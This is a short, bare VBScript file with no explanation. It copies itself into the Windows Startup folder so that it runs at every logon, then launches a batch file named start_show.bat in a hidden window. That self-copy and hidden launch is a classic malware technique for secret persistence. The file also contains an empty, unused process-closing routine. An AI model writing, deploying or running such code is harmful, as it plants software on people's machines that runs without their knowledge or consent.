dim fso,ws,pt,msg 
set fso = createobject("scripting.filesystemobject") 
set ws = createobject("wscript.shell") 
set file = fso.getfile(wscript.scriptfullname) 
pt = ws.specialfolders("startup") &"\" 
file.copy pt 
sub Close_Process(ProcessName) On Error Resume Next end sub

Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c start_show.bat",0